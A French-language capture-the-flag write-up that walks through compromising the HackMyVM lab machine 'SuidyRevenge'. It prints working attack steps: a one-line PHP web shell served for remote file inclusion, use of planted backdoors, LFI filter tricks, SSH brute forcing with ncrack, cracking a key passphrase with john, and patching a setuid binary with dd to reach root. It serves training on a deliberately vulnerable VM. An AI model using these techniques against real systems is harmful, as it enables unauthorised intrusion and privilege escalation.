---
title: "Solution du CTF SuidyRevenge de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### La revanche !

`SuidyRevenge` est sans trop de surprises la suite du CTF [Suidy]({% link _posts/2025-05-18-Solution-du-CTF-Suidy-de-HackMyVM.md %}), lui-même téléchargeable sur [HackMyVM.eu](https://hackmyvm.eu/).

Sur la VM, on trouve les services classiques : HTTP et SSH.

```console
$ sudo nmap -T5 -p- 192.168.56.102
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.102
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:34:6C:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
```

La page d'index contient des commentaires intéressants.

```console
$ curl -s http://192.168.56.102/
Im proud to announce that "theuser" is not anymore in our servers.
Our admin "mudra" is the best admin of the world.
-suidy

<!--

"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!

-theuser

-->
```

J'ai tout de suite pensé à _Weevely_, que je n'ai jamais essayé parce que bon, c'est juste une backdoor PHP et j'ai d'autres chats à fouetter.

Mais je n'ai pas trouvé de `weevely.php` dans ce dossier `/supersecure`.

Brute-forcer à l'aide d'une wordlist semble peu efficace, alors j'ai fouiné un peu sur le web et j'ai trouvé des infos sur ce package kali Linux :

[https://www.kali.org/tools/webshells/](https://www.kali.org/tools/webshells/)

On y trouve une liste de backdoors web présentes sur kali.

J'ai testé différents noms de fichiers à la mano et je suis tombé sur le script `simple-backdoor.php` qui n'attendait qu'un paramètre `cmd`.

Par exemple `cmd=id` donne `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

Mais dès que l'on souhaite passer un paramètre à la commande, ça ne marche plus, comme si ça bloquait au premier whitespace.

Sans espace, on peut tout de faire faire un `ls` et il m'a révélé l'autre backdoor : `mysuperbackdoor.php`.

Ce script mentionnait qu'il avait besoin d'un paramètre `file`. Je lui ai passé `simple-backdoor.php` et au lieu d'obtenir le code source, j'ai eu la même réponse que précédemment, preuve que le script fait une inclusion et pas seulement un directory traversal.

Du coup, je lui ai passé ce filtre PHP pour obtenir le contenu de `simple-backdoor.php` en base64 :

```
php://filter/convert.base64-encode/resource=simple-backdoor.php
```

Voici le code :

```php
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $result = preg_replace("/[^a-zA-Z0-9]+/", "", $cmd);
        system($result);
        echo "</pre>";
        die;
}

?>
```

Ca explique nos difficultés.

En chargeant `/etc/passwd` on obtient quelques utilisateurs.

```
murda:x:1000:1000:murda,,,:/home/murda:/bin/bash
violent:x:1001:1001:,,,:/home/violent:/bin/bash
yo:x:1002:1002:,,,:/home/yo:/bin/bash
ruin:x:1003:1003:,,,:/home/ruin:/bin/bash
theuser:x:1004:1004:,,,:/home/theuser:/bin/bash
suidy:x:1005:1005:,,,:/home/suidy:/bin/bash
```

Il est désormais temps de tester la RFI (inclusion distante). Pour cela, il faut un serveur qui n'interprète pas le PHP, ce sera + simple :

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80
```

Suspense... ça fonctionne ! J'ai donc rapatrié et exécuté un `reverse-ssh`.

### Brute et re-brute

Je découvre un message laissé dans la racine web :

```console
www-data@suidyrevenge:/var/www/html$ ls -al
total 20
drwxr-xr-x 3 root     root     4096 Oct  1  2020 .
drwxr-xr-x 3 root     root     4096 Oct  1  2020 ..
-rw-r--r-- 1 root     root      322 Oct  1  2020 index.html
-rw-r--r-- 1 www-data www-data   79 Oct  1  2020 murdanote.txt
drwxr-xr-x 2 root     root     4096 Oct  1  2020 supersecure
www-data@suidyrevenge:/var/www/html$ cat murdanote.txt
I always lost my password so Im using 
one password from rockyou.txt !

-murda
```

Cet utilisateur est un peu étrange : l'obtention d'information sur ses fichiers done peu d'infos. On se demande comment le compte a été créé.

```console
www-data@suidyrevenge:/home$ ls murda/ -al
ls: cannot access 'murda/.local': Permission denied
ls: cannot access 'murda/.bashrc': Permission denied
ls: cannot access 'murda/.bash_logout': Permission denied
ls: cannot access 'murda/.Xauthority': Permission denied
ls: cannot access 'murda/.bash_history': Permission denied
ls: cannot access 'murda/.profile': Permission denied
ls: cannot access 'murda/..': Permission denied
ls: cannot access 'murda/.': Permission denied
ls: cannot access 'murda/secret.txt': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
-????????? ? ? ? ?            ? .Xauthority
-????????? ? ? ? ?            ? .bash_history
-????????? ? ? ? ?            ? .bash_logout
-????????? ? ? ? ?            ? .bashrc
d????????? ? ? ? ?            ? .local
-????????? ? ? ? ?            ? .profile
-????????? ? ? ? ?            ? secret.txt
```

On peut toutefois s'en tenir à l'indice et brute-forcer avec RockYou :

```console
$ ncrack -v --user murda -P rockyou.txt ssh://192.168.56.102

Starting Ncrack 0.8 ( http://ncrack.org ) at 2025-05-19 17:08 CEST

Discovered credentials on ssh://192.168.56.102:22 'murda' 'iloveyou'
```

Pendant que l'attaque brute-force tournait, j'ai fouillé un peu et trouvé la suite du CTF :

```console
www-data@suidyrevenge:/home$ find / -user murda 2> /dev/null 
/home/murda
/usr/games/id_rsa
www-data@suidyrevenge:/home$ ls -al /usr/games/id_rsa
-rwxrwx--- 1 murda murda 1876 Oct  1  2020 /usr/games/id_rsa
```

Une fois connecté sur le compte `murda` on peut lire cette clé ainsi que d'autres informations.

```console
murda@suidyrevenge:~$ ls -al
total 36
drwxrwxr-- 3 murda murda 4096 Oct  1  2020 .
drwxr-xr-x 8 root  root  4096 Oct  1  2020 ..
-rw------- 1 murda murda   25 Oct  1  2020 .bash_history
-rwxrwx--- 1 murda murda  220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 murda murda 3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 murda murda 4096 Oct  1  2020 .local
-rwxrwx--- 1 murda murda  807 Oct  1  2020 .profile
-rwxrwx--- 1 murda murda  178 Oct  1  2020 secret.txt
-rwxrwx--- 1 murda murda   58 Oct  1  2020 .Xauthority
murda@suidyrevenge:~$ cat secret.txt 
I know that theuser is here!
I just got the id_rsa from "violent".
I will put the key in a secure place for theuser!
I hope he find it.
Remember that rockyou.txt is your friend!
```

La clé :

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDGbexiJO
b7KaTASSyt9yKFAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/9FkJSQol
CNgAMG4SeDpKctz5/h6ylTx0vT73OzMwYO97HL/tRrfL0gOWV2UNTuOFwg5fBorYZfBgql
bVzsIuCitxvoButf59aeoZtLxeUUuUm3G7Q06IvLV2vj+VgJ2i2tUjXboCcQ0Yv+Bj9JBC
+/6fG9j+ED7Pi42zjm9zNQsPhrwviHptksnKwpsV5KhBNuO3heeZvydX/sudsCCrYXBKoe
P8abXDqJYXhjskJupu8Rb0bcLxR1uEIGgsRww7waBaiag65WnXBwTrzjriWFdCJcI2lfdc
l7g/b6T5UfxFSzmdNEZvaH/SNvPEpE8bAUW9rcJwwEJZyIrc4z5VAAAD0PmVBELTPOuptO
2LGbENxSNYTLn6TqacFrj76WfTo7Q81QdCw9IJ0ruu0ivvtQWAS2CmG7Hq7vE8b+T6KI8w
sRJkfpON5nr5e+mfCGD7Gt0WVBaZ1SolbN17XoSNyTNq8jqF9EcwnsqIM8SRWrLERufCCs
SMDJlGb2/khum3fgDvI1R7gm0KYQRRJu33qx9ZXHRmCGKvEMV/pSaIJb2JBTQ9N/QcMlVK
RGsVC/NNhwcWSMQh6DGLmcC+yZvo5lxBnNUibWKNtf2zTx6yep6SwVzvt9Qg5aZ1exIEYa
9bmpZCzHVpHHK859U1l0FNJoBFrCiC0CssPv4E+g1iLA47NXYCeQxpWvZPsqXwr+J46vR9
UC+pZHy9bOHc0J+CTP80vEazyMN0Uko9/R2iJ+7GeQgtzoVBt7mqjaoIDljXOQ6YD5F7a8
5LvfFgW691eKdoZbGjaALMdV629MHdm6t5KL56YO9bbWlpgvo61iYqrAE2t+jhlUoQeQ+9
cH8fKHVXctRCypsx577qTwnUFtLn+l3f+Twl1ulxpV/bs497n1a1aDNpAoMJYt0601+3H8
qJQQ12QiBEi1CTvt+W2/d1EQeZ+MDUSqFCLDGE34xu6lI+/Wjmv03qBSRvdUK91MX1Lb2n
uUZN0OH6pJbmj3oxHSB6ADFetH7bVFXKC4VjTGltoRWD3sH2n5UIcVZZ+1qha3n37U8Q1/
OVwSqtTE6NbYQsnsydv9plM1xLkacY9+db35wPBQSVkuiTuENKUbDMIFC8GiFTzshG9Owr
8LvdK+LSxCrjQcAch7AYFma7IEtkJDHHAC2dwHw+ojqb510c9d5oBAd/vboElE9ZjYbOq2
WT9UdY26/LOQ1LZVZ9LU3hW+N9zRLgJZz6jfvELGlS2jxNjBVW8+0dGHOBFxu+lHjyZCaA
YaUwJvd2lTkoLIH3o7Wog7c69tTtVP39Lx2trFCRtWs0eJIP6bGMsB83nwWzxiRnUKX5/3
anvv/RtCRJoEsSX9vtXJpMnE4ZXO4H7LglGWe/dlIRkF/Pm81FPB+kiuAYbe+CRVIvEC+m
dkCybp6++R/Td2GQ/uh3Iz3Q6CbmGEpnjAtUBjizQc4vrPpB0tgsEXpzB5ZAj10IjgK6a+
2PIaEbU2nsSic6JT1tN8GOAx3kca+x94PZ9quSvGxBIjCcre5IC1vDPSl9ltPIZwwvDIbN
ORebGQ41OO++boyqMUAeWPCp0U16acJ7l/copQQcuIZ0mTched3eyetddQ5FMCHv2EbvK5
ovZ9EUC8ryJgnq1/+ECUOutT5q49Q=
-----END OPENSSH PRIVATE KEY-----
```

Si on tente de l'utiliser, on voit qu'elle nécessite un mot de passe :

```console
$ ssh -i violent.key violent@192.168.56.102
Enter passphrase for key 'violent.key':
```

Pour la casser, il faut d'abord en extraire un hash avec `ssh2john` :

```bash
python ssh2john.py violent.key > hash.txt
```

Et ça tombe :

```console
$ john --wordlist=rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
ihateu           (violent.key)     
1g 0:00:01:12 DONE (2025-05-19 20:17) 0.01374g/s 17.15p/s 17.15c/s 17.15C/s ramona..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Frank Dubosc

Une fois connecté avec ce compte, on découvre une règle sudo pour exécuter un binaire :

```console
violent@suidyrevenge:~$ sudo -l
Matching Defaults entries for violent on suidyrevenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User violent may run the following commands on suidyrevenge:
    (root) NOPASSWD: /usr/bin/violent
```

À première vue ce programme n'a rien d'intéressant :

```console
violent@suidyrevenge:~$ strings /usr/bin/violent
/lib64/ld-linux-x86-64.so.2
libc.so.6
printf
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
WhatImdoH
ingWithMH
yLifeGODH
[]A\A]A^A_
IM VIOLENT
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
--- snip ---
violent@suidyrevenge:~$ ls -al /usr/bin/violent
-rwsr-sr-x 1 root violent 16608 Oct  1  2020 /usr/bin/violent
violent@suidyrevenge:~$ sudo /usr/bin/violent
IM VIOLENT
```

On peut s'en rendre plus compte avec `ltrace`.

```console
$ ltrace ./violent 
printf("IM VIOLENT")                                                                                                              = 10
IM VIOLENT+++ exited (status 121) +++
```

Si on essaye de remettre en ordre les quelques chaines de caractères présentes dans le binaire (`WhatImdoingWithMyLifeGOD`)... ça ne sert à rien, bien que j'espérais qu'il s'agisse du mot de passe de `theuser`.

Si on se rappelle le message du début, on pouvait lire quelque chose comme

> He only changed my password to a different

En fait le mot de passe de `theuser` est `different`... Quel humour de merde !

On peut aussi l'avoir via brute-force :

```console
$ ncrack --user theuser -P rockyou.txt ssh://192.168.56.102

Starting Ncrack 0.8 ( http://ncrack.org ) at 2025-05-19 17:51 CEST
Stats: 3:54:42 elapsed; 0 services completed (1 total)
Rate: 5.67; Found: 1; About 0.48% done
(press 'p' to list discovered credentials)
Discovered credentials for ssh on 192.168.56.102 22/tcp:
192.168.56.102 22/tcp ssh: 'theuser' 'different'
```

### Dédé

```console
theuser@suidyrevenge:~$ cat user.txt 
                                                                                
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                                                                
                                                                                
                                                                                
HMVbisoususeryay
```

Une recherche sur les fichiers dont le groupe est `theuser` me ramène un binaire setuid :

```console
theuser@suidyrevenge:~$ find / -group theuser -ls 2> /dev/null | grep -v /proc/ | grep -v /sys/
   267621     20 -rwsrws---   1 root     theuser     16712 Oct  2  2020 /home/suidy/suidyyyyy
   267576      4 drwxrwx---   3 theuser  theuser      4096 Oct  2  2020 /home/theuser
     1583      4 drwxr-xr-x   3 theuser  theuser      4096 Oct  1  2020 /home/theuser/.local
     1602      4 drwx------   3 theuser  theuser      4096 Oct  1  2020 /home/theuser/.local/share
     3466      4 drwx------   2 theuser  theuser      4096 Oct  1  2020 /home/theuser/.local/share/nano
   267578      4 -rwxrwx---   1 theuser  theuser      3526 Oct  1  2020 /home/theuser/.bashrc
   267580      4 -rwxrwx---   1 theuser  theuser       220 Oct  1  2020 /home/theuser/.bash_logout
   267602      4 -rw-r-----   1 theuser  theuser      1961 Oct  2  2020 /home/theuser/user.txt
   267613      4 -rw-------   1 theuser  theuser        33 Oct  2  2020 /home/theuser/.bash_history
   267581      4 -rwxrwx---   1 theuser  theuser       807 Oct  1  2020 /home/theuser/.profile
    80840      0 drwx------   3 theuser  theuser        60 May 19 11:52 /run/user/1004
    80942      0 drwxr-xr-x   2 theuser  theuser        80 May 19 11:52 /run/user/1004/systemd
    80954      0 srwxr-xr-x   1 theuser  theuser         0 May 19 11:52 /run/user/1004/systemd/private
    80950      0 srwxr-xr-x   1 theuser  theuser         0 May 19 11:52 /run/user/1004/systemd/notify
     3525      0 -rw-------   1 root     theuser         0 May 19 11:52 /var/lib/sudo/lectured/theuser
```

Il permet de passer directement au compte `suidy` :

```console
theuser@suidyrevenge:~$ /home/suidy/suidyyyyy
suidy@suidyrevenge:~$ id
uid=1005(suidy) gid=1004(theuser) groups=1004(theuser)
suidy@suidyrevenge:~$ cd /home/suidy
suidy@suidyrevenge:/home/suidy$ ls -al
total 52
drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
suidy@suidyrevenge:/home/suidy$ cat note.txt
I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
```

Ce binaire `suidy` appartient à `root` et a le bit `setuid` mais le code détermine quels privilèges il donne :

```console
$ ltrace ./suidyyyyy 
setuid(1005)                                                                                                                      = -1
setgid(1005)                                                                                                                      = -1
system("/bin/bash"
```

On va noter les adresses des instructions dans le binaire (ouvert avec `Cutter`) :

```nasm
int main(int argc, char **argv, char **envp);
0x00001155      push    rbp
0x00001156      mov     rbp, rsp
0x00001159      mov     edi, data.000003ed ; 0x3ed
0x0000115e      call    setuid     ; sym.imp.setuid
0x00001163      mov     edi, data.000003ed ; 0x3ed
0x00001168      call    setgid     ; sym.imp.setgid
0x0000116d      lea     rdi, str.bin_bash ; 0x2004 ; const char *string
0x00001174      mov     eax, 0
0x00001179      call    system     ; sym.imp.system ; int system(const char *string)
0x0000117e      mov     eax, 0
0x00001183      pop     rbp
0x00001184      ret
```

Voici les adresses :

```python
$ python3
Python 3.12.4 (main, Jul  8 2024, 21:18:15) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x00001159
4441
>>> 0x00001163
4451
```

On retrouve la valeur `0x3ed` (soit 1005) dans le dump hexadécimal :

```console
$ hexdump -C -s 4441 -n 32 suidyyyyy 
00001159  bf ed 03 00 00 e8 ed fe  ff ff bf ed 03 00 00 e8  |................|
00001169  d3 fe ff ff 48 8d 3d 90  0e 00 00 b8 00 00 00 00  |....H.=.........|
00001179
```

Je vais éditer les deux instructions assembleur `mov` pour écrire `0` à la place de `1005` :

```bash
echo -ne '\x00\x00' | dd of=suidyyyyy bs=1 seek=4442 count=2 conv=notrunc
echo -ne '\x00\x00' | dd of=suidyyyyy bs=1 seek=4452 count=2 conv=notrunc
```

Exécution :

```console
theuser@suidyrevenge:/home/suidy$ ls -l suidyyyyy 
-rwsrws--- 1 root theuser 16712 Oct  2  2020 suidyyyyy
theuser@suidyrevenge:/home/suidy$ echo -ne '\x00\x00' | dd of=suidyyyyy bs=1 seek=4442 count=2 conv=notrunc
2+0 records in
2+0 records out
2 bytes copied, 0.00113622 s, 1.8 kB/s
theuser@suidyrevenge:/home/suidy$ echo -ne '\x00\x00' | dd of=suidyyyyy bs=1 seek=4452 count=2 conv=notrunc
2+0 records in
2+0 records out
2 bytes copied, 0.00029252 s, 6.8 kB/s
theuser@suidyrevenge:/home/suidy$ ls -l suidyyyyy 
-rwxrwx--- 1 root theuser 16712 May 19 12:12 suidyyyyy
theuser@suidyrevenge:/home/suidy$ ls -l suidyyyyy 
-rwsrws--- 1 root theuser 16712 May 19 12:12 suidyyyyy
theuser@suidyrevenge:/home/suidy$ ./suidyyyyy
root@suidyrevenge:/home/suidy# id
uid=0(root) gid=0(root) groups=0(root),1004(theuser)
root@suidyrevenge:/home/suidy# cd /root
root@suidyrevenge:/root# ls
root.txt  script.sh  suidyyyyy
root@suidyrevenge:/root# cat root.txt
                                                                                
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                                                                
                                                                                
HMVvoilarootlala
```


